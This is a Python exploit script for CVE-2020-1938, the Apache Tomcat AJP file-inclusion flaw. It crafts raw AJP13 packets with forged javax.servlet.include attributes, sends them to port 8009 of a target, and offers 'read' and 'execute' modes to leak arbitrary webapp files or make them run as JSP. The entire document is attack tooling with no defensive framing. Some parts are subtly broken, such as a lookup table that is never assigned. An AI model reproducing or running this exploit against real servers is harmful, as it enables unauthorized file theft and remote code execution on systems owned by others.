import argparse
import socket

class Response:
	def __init__(self,magic):#parser
		self.magic=magic
		self.length= 0
		self.code=""
		self.rstatus=0
		self.rmsg=""
		self.nhdr=0
		self.headers=[]
		self.rep=""
		self.reusep=0

	def calcul_headers(self,debut,p):
		test_headers=p[debut:4+debut]

		liste_headers=['a001','a002','a003','a004','a005','a006','a007','a008','a009','a00a','a00b']
		if test_headers not in liste_headers:
			length_part1=int(test_headers,16)*2
			part1=p[4+debut:length_part1+4+debut]
			part1=bytes.fromhex(part1).decode('utf-8')
			debut=length_part1+4+debut
			length_part2=int(p[debut+2:debut+6],16)*2

			debut=debut+6
			part2=p[debut:length_part2+debut]
			part2=bytes.fromhex(part2).decode('utf-8')
			self.headers.append(part1+":"+part2)
			fin = length_part2+debut+2
			return fin
		else:
			length_part12=int(p[4+debut:8+debut],16)*2
			part12=p[8+debut:length_part12+8+debut]
			part12=bytes.fromhex(part12).decode('utf-8')
			self.headers.append(part12)
			fin = length_part12+10+debut
			return fin

	def parse(self,p):
		self.magic=p[0:4]
		self.length=p[4:8]
		self.code=int(p[8:10],16)
		if self.code == 4:
			self.rstatus=int(p[10:14],16)
			taille_rmsg=int(p[14:18],16)*2
			self.rmsg=bytes.fromhex(p[18:18+taille_rmsg]).decode('utf-8')
			self.nhdr=int(p[20+taille_rmsg:24+taille_rmsg],16)
			debut=24+taille_rmsg
			for i in range(0,self.nhdr):
				debut=self.calcul_headers(debut,p)
		
		elif self.code == 3:
			taille_data = int(p[10:14],16)*2
			self.rep=bytes.fromhex(p[14:taille_data+14]).decode('utf-8')
		elif self.code == 5:
			self.reusep= int(p[10:12],16)

	def __str__(self):
		if self.code==3:
			return self.rep
		return ""

	def __repr__(self):
		return self.__str__()

class ApachJservProtocol:#crafter
	def __init__(self,uri,raddr,port,sslp,header1,header2,header3,header4,header5):
		self.magic=0x1234
		self.length= 0
		self.code="FORWARD_REQUEST"
		self.method= "GET"
		self.version= "HTTP/1.1"
		self.uri= uri
		self.raddr = raddr
		self.rhost = b'\xff\xff'
		self.srv = raddr
		self.port = port
		self.sslp = sslp
		self.nhdr = b'\x00\x09'
		self.header1 = header1
		self.attr1= "keep-alive"
		self.accept_language = "en-US,en;q=0,5"
		self.header2=header2
		self.attr2 = "0"
		self.accept_encoding = "gzip, deflate, sdch"
		self.cache_control = "max-age=0"
		self.header3=header3
		self.attr3="Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0"
		self.upgrade_insecure_requests="1"
		self.header4=header4
		self.attr4="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
		self.attr5 = raddr
		self.attr6=["javax.servlet.include.request_uri","/"]
		self.attr7=["javax.servlet.include.path_info", "/"+fichier]
		self.attr8=["javax.servlet.include.servlet_path", "/"]


	def sslp_byte(self):
		if not self.sslp:
			return b'\x00'
		return b'\x01'
	def byte_sslp(self,value):
		if value == b'\x00':
			return False
		return True

	def code_byte(self): #CRAFT
		dic ={'DATA':0,'FORWARD_REQUEST':2,'SEND BODY CHUNK':3,'SEND HEADERS':4,'END RESPONSE':5,'GET BODY CHUNK':6,'SHUDOWN':7,'PING':8,'CPONG REPLY':9,'CPING':10}
		if self.code in dic:
			return dic[self.code].to_bytes(1, byteorder='big')
		return b'\x00'

	def bytes_code(self,value): #PARSE
		{0: 'DATA', 2: 'FORWARD_REQUEST', 3: 'SEND BODY CHUNK', 4: 'SEND HEADERS', 5: 'END RESPONSE', 6: 'GET BODY CHUNK', 7: 'SHUDOWN', 8: 'PING', 9: 'CPONG REPLY', 10: 'CPING'}
		if value in dic:
			self.method=dic[value]
			return dic[value]
		return ""
	def method_byte(self):
		dic={'OPTIONS': 1, 'GET': 2, 'HEAD': 3, 'POST': 4, 'PUT': 5, 'DELETE': 6, 'TRACE': 7, 'PROPFIND': 8, 'PROPPATCH': 9, 'MKCOL': 10, 'COPY': 11, 'MOVE': 12, 'LOCK': 13, 'UNLOCK': 14, 'ACL': 15, 'REPORT': 16, 'VERSION-CONTROL': 17, 'CHECKIN': 18, 'CHECKOUT': 19, 'UNCHECKOUT': 20, 'SEARCH': 21, 'MKWORKSPACE': 22, 'UPDATE': 23, 'LABEL': 24, 'MERGE': 25, 'BASELINE_CONTROL': 26, 'MKACTIVITY': 27}
		if self.method in dic:
			return dic[self.method].to_bytes(1, byteorder='big')
		return b'\x00'

	def bytes_method(self,value):
		dic={1: 'OPTIONS', 2: 'GET', 3: 'HEAD', 4: 'POST', 5: 'PUT', 6: 'DELETE', 7: 'TRACE', 8: 'PROPFIND', 9: 'PROPPATCH', 10: 'MKCOL', 11: 'COPY', 12: 'MOVE', 13: 'LOCK', 14: 'UNLOCK', 15: 'ACL', 16: 'REPORT', 17: 'VERSION-CONTROL', 18: 'CHECKIN', 19: 'CHECKOUT', 20: 'UNCHECKOUT', 21: 'SEARCH', 22: 'MKWORKSPACE', 23: 'UPDATE', 24: 'LABEL', 25: 'MERGE', 26: 'BASELINE_CONTROL', 27: 'MKACTIVITY'}
		if value in dic:
			self.method=dic[value]
			return dic[value]
		return ""

	def header_byte(self,value):
		dic = {'SC_REQ_ACCEPT': 40961, 'SC_REQ_ACCEPT_CHARSET': 40962, 'SC_REQ_ACCEPT_ENCODING': 40963, 'SC_REQ_ACCEPT_LANGUAGE': 40964, 'SC_REQ_AUTHORIZATION': 40965, 'SC_REQ_CONNECTION': 40966, 'SC_REQ_CONTENT_TYPE': 40967, 'SC_REQ_CONTENT_LENGTH': 40968, 'SC_REQ_COOKIE': 40969, 'SC_REQ_COOKIE2': 40970, 'SC_REQ_HOST': 40971, 'SC_REQ_PRAGMA': 40972, 'SC_REQ_REFERER': 40973, 'SC_REQ_USER_AGENT': 40974}
		if value in dic:
			return dic[value].to_bytes(2, byteorder='big')
		return b'\x00'

	def byte_header(self,value):
		dic = {40961: 'SC_REQ_ACCEPT', 40962: 'SC_REQ_ACCEPT_CHARSET', 40963: 'SC_REQ_ACCEPT_ENCODING', 40964: 'SC_REQ_ACCEPT_LANGUAGE', 40965: 'SC_REQ_AUTHORIZATION', 40966: 'SC_REQ_CONNECTION', 40967: 'SC_REQ_CONTENT_TYPE', 40968: 'SC_REQ_CONTENT_LENGTH', 40969: 'SC_REQ_COOKIE', 40970: 'SC_REQ_COOKIE2', 40971: 'SC_REQ_HOST', 40972: 'SC_REQ_PRAGMA', 40973: 'SC_REQ_REFERER', 40974: 'SC_REQ_USER_AGENT'}
		if value in dic:
			self.method=dic[value]
			return dic[value]
		return ""	

	def string_byte(self,value,nb_byte=2):
		s= len(value.encode()).to_bytes(nb_byte, byteorder='big')+value.encode()+b'\x00'
		return s

	def __bytes__(self):
		data=b''
		data+=self.code_byte()
		data+=self.method_byte()
		data+=self.string_byte(self.version)
		data+=self.string_byte(self.uri)
		data+=self.string_byte(self.raddr)
		data+=self.rhost
		data+=self.string_byte(self.srv)
		data+=self.port.to_bytes(2, byteorder='big')
		data+=self.sslp_byte()
		data+=self.nhdr
		data+=self.header_byte(header1)
		data+=self.string_byte(self.attr1)
		data+=self.string_byte('Accept-Language')+self.string_byte(self.accept_language)
		data+=self.header_byte(header2)+self.string_byte(self.attr2)
		data+=self.string_byte('Accept-Encoding')+self.string_byte(self.accept_encoding)
		data+=self.string_byte('Cache-Control')+self.string_byte(self.cache_control)
		data+=self.header_byte(header3)+self.string_byte(self.attr3)
		data+=self.string_byte('Upgrade-Insecure-Requests')+self.string_byte(self.upgrade_insecure_requests)
		data+=self.header_byte(header4)+self.string_byte(self.attr4)
		data+=self.header_byte(header5)+self.string_byte(self.attr5)
		data+=b'\x0A'+self.string_byte(self.attr6[0])+self.string_byte(self.attr6[1])
		data+=b'\x0A'+self.string_byte(self.attr7[0])+self.string_byte(self.attr7[1])
		data+=b'\x0A'+self.string_byte(self.attr8[0])+self.string_byte(self.attr8[1])+b'\xff'
		
		header_packet=b''
		header_packet+=self.magic.to_bytes(2, byteorder='big')
		header_packet+=len(data).to_bytes(2, byteorder='big')
		
		return header_packet+data


uri=""
raddr="x.x.x.x"
port=80
sslp=False
header1 = 'SC_REQ_CONNECTION'
header2 = 'SC_REQ_CONTENT_LENGTH'
header3 = 'SC_REQ_USER_AGENT'
header4 = 'SC_REQ_ACCEPT'
header5 = 'SC_REQ_HOST'
fichier = ''
magic='4142'
c=ApachJservProtocol(uri,raddr,port,sslp,header1,header2,header3,header4,header5)


def analyse_packet(packet):
	liste=[]
	tmp=0
	while tmp < len(packet) : 
		longueur=(int(packet[4+tmp:8+tmp],16)+4)*2
		p=packet[0+tmp:longueur+tmp]
		tmp +=len(p)
		liste.append(p)

	return liste

def send_receive(c,addr):

	hote = addr
	port = 8009

	socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket2.connect((hote, port))
	socket2.send(bytes(c))

	l=[]
	reponses=[]
	while len(l)<3:
		data = socket2.recv(4096)
		tmp=data.hex()
		l.extend(analyse_packet(tmp))
	for i in l:
		r =Response(i[0:4])
		r.parse(i)
		reponses.append(r)	
	socket2.close()
	return reponses	
	


parser = argparse.ArgumentParser(description='CVE-2020-1938')
subparsers = parser.add_subparsers()

lecture=subparsers.add_parser("read", help="read file you use here")
lecture.set_defaults(which="reading")
lecture.add_argument("-w","--webapp", type=str, default="/ROOT", help="webapp")
lecture.add_argument("path",type=str,help="path file")
lecture.add_argument("addr",type=str,help="adresse")


execute=subparsers.add_parser("execute", help="execute file you use here")
execute.set_defaults(which="execution")
execute.add_argument("-w","--webapp", type=str, default="/ROOT", help="webapp")
execute.add_argument("path",type=str,help="path file")
execute.add_argument("addr",type=str,help="adresse")
args = parser.parse_args()
s=[]
if args.which == "reading":
	c.attr7=["javax.servlet.include.path_info", "/"+args.path]
	c.uri=args.webapp+"/toto.toto"
	s=send_receive(c,args.addr)
elif args.which == "execution":
	c.attr7=["javax.servlet.include.path_info", "/"+args.path]
	c.uri=args.webapp+"/toto.jsp"
	s=send_receive(c,args.addr)
	
for p in s:
	if p.code==3:
		print(p)

